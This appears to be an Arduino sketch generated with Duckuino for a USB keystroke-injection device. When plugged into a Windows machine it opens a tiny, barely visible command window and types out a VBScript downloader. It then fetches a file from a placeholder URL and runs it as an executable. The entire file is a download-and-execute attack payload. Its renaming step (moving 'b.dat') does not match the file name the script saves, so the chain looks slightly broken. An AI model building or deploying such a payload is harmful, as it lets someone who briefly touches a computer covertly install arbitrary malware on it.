/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  typeKey(KEY_ESC);

  //Keyboard.press(KEY_LEFT_CTRL);
  //Keyboard.press(KEY_ESC);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print(F("cmd"));

  delay(1000);
  typeKey(KEY_RETURN);

  delay(4000);
  Keyboard.print(F("mode 15,1"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("del a.vbs"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("copy con a.vbs"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("If objXMLHTTP.Status = 200 Then"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing"));

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print(F("cscript a.vbs https://urltoexecutable"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("del /F executable.exe"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("move b.dat executable.exe"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("executable.exe"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
